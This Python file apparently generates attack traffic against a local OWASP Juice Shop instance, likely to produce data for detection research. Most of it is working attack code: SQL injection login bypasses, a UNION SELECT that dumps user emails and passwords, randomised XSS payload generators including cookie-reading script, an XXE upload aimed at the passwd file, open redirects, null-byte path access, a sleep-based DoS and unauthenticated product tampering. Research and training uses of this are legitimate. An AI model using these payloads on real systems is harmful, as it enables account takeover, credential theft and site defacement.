# from selenium import webdriver
import os
import time
import json
import random
import datetime
import string
import requests
import paramiko
import base64
from time import sleep
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException

from config import config
from firebaseDAO import FirebaseDAO
from Scenarios.normalScenario import random_sleep, random_comment, Action


class Attack(Action):
    def __init__(self, driver, attackType, firebaseDAO):
        super(Attack, self).__init__(driver=driver, actionType="attack", firebaseDAO=firebaseDAO)
        self.attackType = attackType

        if config['set_up_mode'] == True:
            print ("Set up the inital system with five account")
            for i in range(5):
                super(Attack, self).scenario_register(login_after_register=False)


class DosAttack(Attack):
    def __init__(self, driver, attackType, firebaseDAO):
        super(DosAttack, self).__init__(driver=driver, attackType=attackType, firebaseDAO=firebaseDAO)

        self.attack_scenario_list = [
            self.scenario_server_random_sleep_attack
        ]

    def scenario_server_random_sleep_attack(self):
        if self.verbose:
            print ("ENTER XXS RETRIEVE PASSWORD ATTACK")
        
        pausing_time = random.randint(1, 2000)
        self.driver.get("http://localhost:" + str(config[self.attackType + "_port"]) + "/rest/product/sleep(" + str(pausing_time) + ")/reviews")
        random_sleep(pausing_time//20, pausing_time//10)
        
        return


class ErrorAttack(Attack):
    def __init__(self, driver, attackType, firebaseDAO):
        super(ErrorAttack, self).__init__(driver=driver, attackType=attackType, firebaseDAO=firebaseDAO)
        
        self.attack_scenario_list = [
            self.scenario_error_message_login_with_single_quote_attack
        ]

    def scenario_error_message_login_with_single_quote_attack(self):
        if self.verbose:
            print ("ENTER ERROR MESSAGE ATTACK")

        # 1. Check if is log in
        if self.is_logged_in:
            self.scenario_logout()
            self.is_logged_in = False

        # 2. Attack under specific pattern
        # 2-1. generate SQL pattern
        attackPasswordLength = random.randint(1, 15)
        randomPassword = ''.join(random.choices(string.ascii_letters + string.digits, k=attackPasswordLength))

        # 2-2. attack in logging in 
        self.driver.find_element_by_xpath('/html/body/nav/div/ul/li[1]').click()
        random_sleep(1, 2)
        self.driver.find_element_by_xpath('//*[@id="userEmail"]').send_keys("'")
        self.driver.find_element_by_xpath('//*[@id="userPassword"]').send_keys(randomPassword)
        self.driver.find_element_by_xpath('//*[@id="loginButton"]').click()

        return


class TamperingAttack(Attack):
    def __init__(self, driver, attackType, firebaseDAO):
        super(TamperingAttack, self).__init__(driver=driver, attackType=attackType, firebaseDAO=firebaseDAO)

        self.attack_scenario_list = [
            self.scenario_link_tampering
        ]

    def scenario_link_tampering(self):
        if self.verbose:
            print ("ENTER LINK TAMPERING ATTACK")

        url = "http://localhost:" + str(config[self.attackType + "_port"]) + "/api/Products/9"
        headers = {"Content-Type": "application/json"}
        body = {"description": "<a href=\"http://kimminich.de\" target=\"_blank\">More...</a>"}
        r = requests.put(url=url, headers=headers, data=json.dumps(body))
        
        if self.verbose:
            print (r.status_code)

        return
    

class XXEAttack(Attack):
    def __init__(self, driver, attackType, firebaseDAO):
        super(XXEAttack, self).__init__(driver=driver, attackType=attackType, firebaseDAO=firebaseDAO)

        self.attack_scenario_list = [
            self.scenario_xxe_retrieve_passwd_attack
        ]
    
    def scenario_xxe_retrieve_passwd_attack(self):
        if self.verbose:
            print ("ENTER XXE RETRIEVE PASSWORD ATTACK")

        # 1. Check if is log in
        if self.is_logged_in == False:
            loginType = random.randint(0, 1)
            if loginType == 0:
                self.scenario_login()
                self.is_logged_in = True
            elif loginType == 1:
                self.scenario_register(login_after_register=True)
                self.is_logged_in = True
        
        random_sleep(10, 20)
        # 2. move to the complaint page
        self.driver.find_element_by_xpath('/html/body/nav/div/ul/li[10]').click()
        random_sleep()

        # 3. type command and upload file
        self.driver.find_element_by_xpath('//*[@id="complaintMessage"]').send_keys(random_comment(2))
        self.driver.find_element_by_xpath('//*[@id="file"]').send_keys(os.getcwd()+"/Scenarios/xxe_tier1.xml")
        self.driver.find_element_by_xpath('//*[@id="submitButton"]').click()

        return


class FileUploadAttack(Attack):
    def __init__(self, driver, attackType, firebaseDAO):
        super(FileUploadAttack, self).__init__(driver=driver, attackType=attackType, firebaseDAO=firebaseDAO)

        self.attack_scenario_list = [
            self.scenario_upload_bigger_file,
            self.scenario_upload_non_pdf_file
        ]

    def scenario_upload_bigger_file(self):
        if self.verbose:
            print ("ENTER UPLOAD BIGGER FILE")

        url = "http://localhost:" + str(config[self.attackType + "_port"]) + "/file-upload"
        """
        ======================================
        TODO: NEED TO INPUT YOUR OWN FILE NAME
        ======================================
        """
        files = {"file": open("Scenarios/HW1.pdf","rb")}

        r = requests.post(url=url, files=files)

        if self.verbose:
            print (r.status_code)

        return


    def scenario_upload_non_pdf_file(self):
        if self.verbose:
            print ("ENTER UPLOAD NON PDF FILE")

        url = "http://localhost:" + str(config[self.attackType + "_port"]) + "/file-upload"
        """
        ======================================
        TODO: NEED TO INPUT YOUR OWN FILE NAME
        ======================================
        """
        files = {"file": open("Scenarios/h.xml","rb")}

        r = requests.post(url=url, files=files)

        if self.verbose:
            print (r.status_code)

        return
    

class SiteVisitingAttack(Attack):
    def __init__(self, driver, attackType, firebaseDAO):
        super(SiteVisitingAttack, self).__init__(driver=driver, attackType=attackType, firebaseDAO=firebaseDAO)

        self.attack_scenario_list = [
            self.scenario_redirect1_attack,
            self.scenario_redirect2_attack,
            self.scenario_find_easter_egg_attack,
            self.scenario_access_signature_file_attack,
            self.scenario_undefine_language_attack
        ]

    def scenario_redirect1_attack(self):
        if self.verbose:
            print ("ENTER REDIRECT 1 ATTACK")

        self.driver.get("http://localhost:" + str(config[self.attackType + "_port"]) + "/redirect?to=https://gratipay.com/juice-shop")

        return


    def scenario_redirect2_attack(self):
        if self.verbose:
            print ("ENTER REDIRECT 2 ATTACK")

        self.driver.get("http://localhost:" + str(config[self.attackType + "_port"]) + "/redirect?to=http://kimminich.de?pwned=https://github.com/bkimminich/juice-shop")

        return


    def scenario_find_easter_egg_attack(self):
        if self.verbose:
            print ("ENTER FIND EASTER EGG ATTACK")
    
        self.driver.get("http://localhost:" + str(config[self.attackType + "_port"]) + "/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg")
    
        return


    def scenario_access_signature_file_attack(self):
        if self.verbose:
            print ("ENTER ACCESS SIGNATURE FILE ATTACK")

        self.driver.get("http://localhost:" + str(config[self.attackType + "_port"]) + "/ftp/suspicious_errors.yml%2500.md")

        return


    def scenario_undefine_language_attack(self):
        if self.verbose:
            print ("ENTER UNDEFINE LANGUAGE ATTACK")

        self.driver.get("http://localhost:" + str(config[self.attackType + "_port"]) + "/i18n/tlh_AA.json")

        return


class SQLAttack(Attack):
    def __init__(self, driver, attackType, firebaseDAO):
        super(SQLAttack, self).__init__(driver=driver, attackType=attackType, firebaseDAO=firebaseDAO)

        self.attack_scenario_list = [
            self.scenario_admin_login_without_passwd_attack,
            self.scenario_user_login_without_passwd_attack,
            self.scenario_retrieve_user_credentials_attack,
            self.scenario_sql_login_attack
        ]

    
    def scenario_admin_login_without_passwd_attack(self):
        if self.verbose:
            print ("ENTER ADMIN LOGIN WITHOUT PASSWD ATTACK")

        # 1. Check if is log in
        if self.is_logged_in:
            self.scenario_logout()
            self.is_logged_in = False

        # 2. Attack under specific pattern
        # 2-1. generate SQL pattern
        attackPasswordLength = random.randint(1, 15)
        randomPassword = ''.join(random.choices(string.ascii_letters + string.digits, k=attackPasswordLength))

        # 2-2. attack in logging in 
        self.driver.find_element_by_xpath('/html/body/nav/div/ul/li[1]').click()
        random_sleep(1, 2)
        self.driver.find_element_by_xpath('//*[@id="userEmail"]').send_keys("admin@juice-sh.op'--")
        self.driver.find_element_by_xpath('//*[@id="userPassword"]').send_keys(randomPassword)
        self.driver.find_element_by_xpath('//*[@id="loginButton"]').click()
        self.is_logged_in = True

        return


    def scenario_user_login_without_passwd_attack(self):
        if self.verbose:
            print ("ENTER USER LOGIN WITHOUT PASSWD ATTACK")

        # 1. Check if is log in
        if self.is_logged_in:
            self.scenario_logout()
            self.is_logged_in = False

        # 2. Attack under specific pattern
        # 2-1. generate SQL pattern
        attackPasswordLength = random.randint(1, 15)
        randomPassword = ''.join(random.choices(string.ascii_letters + string.digits, k=attackPasswordLength))

        # 2-2. attack in logging in 
        email = ["bender@juice-sh.op'--", "jim@juice-sh.op'--"]

        self.driver.find_element_by_xpath('/html/body/nav/div/ul/li[1]').click()
        random_sleep(1, 2)
        self.driver.find_element_by_xpath('//*[@id="userEmail"]').send_keys(email[random.randint(0, 1)])
        self.driver.find_element_by_xpath('//*[@id="userPassword"]').send_keys(randomPassword)
        self.driver.find_element_by_xpath('//*[@id="loginButton"]').click()
        self.is_logged_in = True

        return


    def scenario_retrieve_user_credentials_attack(self):
        if self.verbose:
            print ("ENTER RETRIEVE USER CREDENTIALS ATTACK")

        self.driver.get("http://localhost:" + str(config[self.attackType + "_port"]) + "/rest/product/search?q=qwert')) UNION SELECT '1', id, email, password, '5', '6', '7', '8' FROM Users--")

        return

    
    def scenario_sql_login_attack(self):
        def generate_true_sql_statement(case=True):
            equalSign = "="
            nonequalSign = "!="
            if case == False:
                equalSign = "!="
                nonequalSign = "="

            returnStatement = ""
            if random.randint(0, 1) == 0:
                # equal
                if random.randint(0, 1) == 0:
                    # english character
                    word = random.choice(string.ascii_letters)
                    returnStatement = "\'" + word + "\'" + equalSign + "\'" + word + "\'"
                else:
                    # numbers
                    num = random.randint(0, 9)
                    returnStatement = "\'" + str(num) + "\'" + equalSign + "\'" + str(num) + "\'"
            else:
                # non equal
                if random.randint(0, 1) == 0:
                    # english character
                    word1 = random.choice(string.ascii_letters)
                    word2 = random.choice(string.ascii_letters)
                    while word1 == word2:
                        word2 = random.choice(string.ascii_letters)
                    returnStatement = "\'" + word1 + "\'" + nonequalSign + "\'" + word2 + "\'"
                else:
                    # numbers
                    num1 = random.randint(0, 9)
                    num2 = random.randint(0, 9)
                    while num1 == num2:
                        num2 = random.randint(0, 9)
                    returnStatement = "\'" + str(num1) + "\'" + nonequalSign + "\'" + str(num2) + "\'"
                    
            return returnStatement

        if self.verbose:
            print ("ENTER SQL LOGIN ATTACK")

        # 1. Check if is log in
        if not self.is_logged_in:
            loginType = random.randint(0, 1)
            if loginType == 0:
                self.scenario_login()
            elif loginType == 1:
                self.scenario_register(login_after_register=True)
            self.is_logged_in = True

        # 2. Attack under specific pattern
        # 2-1. generate SQL pattern
        attackHeader = "\' or "
        attackFooter = generate_true_sql_statement(case=True)
        attackSessionLength = random.randint(0, 3)

        for i in range(attackSessionLength):
            if random.randint(0, 1) == 0:
                # append the header
                attackHeader += generate_true_sql_statement(case=True) if random.randint(0, 1) == 0 else generate_true_sql_statement(case=False)
                attackHeader += " or "
            else:
                # append the footer
                if random.randint(0, 1) == 0:
                    # append and
                    attackFooter += " and "
                    attackFooter += generate_true_sql_statement(case=True)
                else:
                    # append or
                    attackFooter += " or "
                    attackFooter += generate_true_sql_statement(case=True) if random.randint(0, 1) == 0 else generate_true_sql_statement(case=False)


        attackPasswordLength = random.randint(1, 15)
        randomPassword = ''.join(random.choices(string.ascii_letters + string.digits, k=attackPasswordLength))

        # 2-2. attack in loggin in
        self.driver.find_element_by_xpath('/html/body/nav/div/ul/li[1]').click()
        random_sleep(1, 2)
        self.driver.find_element_by_xpath('//*[@id="userEmail"]').send_keys(attackHeader + attackFooter + "--")
        self.driver.find_element_by_xpath('//*[@id="userPassword"]').send_keys(randomPassword)
        self.driver.find_element_by_xpath('//*[@id="loginButton"]').click()
        
        return


class XSSAttack(Attack):
    def __init__(self, driver, attackType, firebaseDAO):
        super(XSSAttack, self).__init__(driver=driver, attackType=attackType, firebaseDAO=firebaseDAO)
        self.attack_scenario_list = [
            self.scenario_xss_trackorders_attack,
            self.scenario_xss_searchbar_attack,
            self.scenario_xss_user_register_attack,
            self.scenario_xss_contact_attack
        ]
        

    def scenario_xss_trackorders_attack(self):
        if self.verbose:
            print ("ENTER XSS TRACKORDER ATTACK")

        # 1. Check if is log in
        if not self.is_logged_in:
            loginType = random.randint(0, 1)
            if loginType == 0:
                self.scenario_login()
            elif loginType == 1:
                self.scenario_register(login_after_register=True)
            self.is_logged_in = True

        # 2. Attack under specific pattern
        # 2-1. generate XSS pattern
        attack = ""
        random_sleep(1, 3)
        attackCategory = random.randint(0, 8)
        attackKeyWordLength = random.randint(1, 500)

        if attackCategory == 0:
            attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
            attack = "<IMG \"\"\"><SCRIPT>alert(\"" + attackKeyWord + "\")</SCRIPT>\">"
        elif attackCategory == 1:
            attackKeyWord = []
            for i in range(attackKeyWordLength):
                attackKeyWord.append(str(random.randint(65, 122)))
            attack = "<IMG SRC=/ onerror=\"alert(String.fromCharCode(" + ",".join(attackKeyWord) + "))\"></img>"
        elif attackCategory == 2:
            attackKeyWord = []
            for i in range(attackKeyWordLength):
                attackKeyWord.append(str(random.randint(65, 122)))
            attack = "<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#00000" + "&#00000".join(attackKeyWord) + "&#0000039&#0000041\">"
        elif attackCategory == 3:
            attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
            attack = "<<SCRIPT>alert(\"" + attackKeyWord + "\");//<</SCRIPT>"
        elif attackCategory == 4:
            attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
            attack = "</script><script>alert(\'" + attackKeyWord + "\');</script>"
        elif attackCategory == 5:
            attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
            attack = "</TITLE><SCRIPT>alert(\"" + attackKeyWord + "\");</SCRIPT>"
        elif attackCategory == 6:
            attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
            attack = "<IFRAME SRC=\"javascript:alert(\'"+ attackKeyWord + "\');\"></IFRAME>"
        elif attackCategory == 7:
            attack = "<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>"
        elif attackCategory == 8:
            attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
            base64String = "<svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.0\" x=\"0\" y=\"0\" width=\"194\" height=\"200\" id=\"xss\"><script type=\"text/ecmascript\">alert(\"" + attackKeyWord + "\");</script></svg>"
            base64decodeString = base64.b64encode(base64String.encode())
            attack = "<EMBED SRC=\"data:image/svg+xml;base64," + str(base64decodeString)[2:-1] + "\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>"

        # 2-2. attack in tracking orders
        random_sleep()
        self.driver.find_element_by_xpath('/html/body/nav/div/ul/li[9]/a').click()
        self.driver.find_element_by_xpath('//*[@id="orderId"]').send_keys(attack)
        random_sleep(5, 10)
        self.driver.find_element_by_xpath('//*[@id="trackButton"]').click()
        random_sleep(2,3)
        self.driver.switch_to_alert().accept()

        return


    def scenario_xss_searchbar_attack(self):
        if self.verbose:
            print ("ENTER XSS SEARCHBAR ATTACK")

        # 1. Check if is log in
        if not self.is_logged_in:
            loginType = random.randint(0, 2)
            if loginType == 0:
                self.scenario_login()
                self.is_logged_in = True
            elif loginType == 1:
                self.scenario_register()
                self.is_logged_in = True

        # 2. Attack under specific pattern
        # 2-1. generate XSS pattern
        attack = ""
        random_sleep(1, 3)
        attackCategory = random.randint(0, 8)
        attackKeyWordLength = random.randint(1, 500)

        if attackCategory == 0:
            attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
            attack = "<IMG \"\"\"><SCRIPT>alert(\"" + attackKeyWord + "\")</SCRIPT>\">"
        elif attackCategory == 1:
            attackKeyWord = []
            for i in range(attackKeyWordLength):
                attackKeyWord.append(str(random.randint(65, 122)))
            attack = "<IMG SRC=/ onerror=\"alert(String.fromCharCode(" + ",".join(attackKeyWord) + "))\"></img>"
        elif attackCategory == 2:
            attackKeyWord = []
            for i in range(attackKeyWordLength):
                attackKeyWord.append(str(random.randint(65, 122)))
            attack = "<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#00000" + "&#00000".join(attackKeyWord) + "&#0000039&#0000041\">"
        elif attackCategory == 3:
            attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
            attack = "<<SCRIPT>alert(\"" + attackKeyWord + "\");//<</SCRIPT>"
        elif attackCategory == 4:
            attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
            attack = "</script><script>alert(\'" + attackKeyWord + "\');</script>"
        elif attackCategory == 5:
            attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
            attack = "</TITLE><SCRIPT>alert(\"" + attackKeyWord + "\");</SCRIPT>"
        elif attackCategory == 6:
            attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
            attack = "<IFRAME SRC=\"javascript:alert(\'"+ attackKeyWord + "\');\"></IFRAME>"
        elif attackCategory == 7:
            attack = "<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>"
        elif attackCategory == 8:
            attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
            base64String = "<svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.0\" x=\"0\" y=\"0\" width=\"194\" height=\"200\" id=\"xss\"><script type=\"text/ecmascript\">alert(\"" + attackKeyWord + "\");</script></svg>"
            base64decodeString = base64.b64encode(base64String.encode())
            attack = "<EMBED SRC=\"data:image/svg+xml;base64," + str(base64decodeString)[2:-1] + "\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>"
            
        # 2-2. attack in search bar
        self.driver.find_element_by_xpath('/html/body/nav/div/ul/li[4]/form/div/input').clear()
        self.driver.find_element_by_xpath('/html/body/nav/div/ul/li[4]/form/div/input').send_keys(attack)
        random_sleep(5, 10)
        self.driver.find_element_by_xpath('//*[@id="searchButton"]').click()
        random_sleep(2,3)
        self.driver.switch_to_alert().accept()

        return


    def scenario_xss_user_register_attack(self):
        if self.verbose:
            print ("ENTER USER REGISTER XSS ATTACK")

        url = "http://localhost:" + str(config[self.attackType + "_port"]) + "/api/Users"
        headers = {"Content-Type": "application/json"}
        attackKeyWordLength = random.randint(1, 500)
        attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
        payload = {"email": "<iframe src=\"javascript:alert(`" + attackKeyWord + "`)\">", "password": "xss"}

        r = requests.post(url=url, headers=headers, data=json.dumps(payload))

        if self.verbose:
            print (r.status_code)    

        return


    def scenario_xss_contact_attack(self):
        if self.verbose:
            print ("ENTER XSS CONTACT ATTACK")

        # Check if is log in
        if not self.is_logged_in:
            loginType = random.randint(0, 2)
            if loginType == 0:
                self.scenario_login()
                self.is_logged_in = True
            elif loginType == 1:
                self.scenario_register(login_after_register=True)
                self.is_logged_in = True

        attack = ""
        random_sleep(1, 3)
        attackKeyWordLength = random.randint(1, 100)
        attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
        attack = "<<script>Foo</script>iframe src=\"javascript:alert(`" + attackKeyWord + "`)\">"
        
        self.scenario_contact(contant=attack)
        
        return
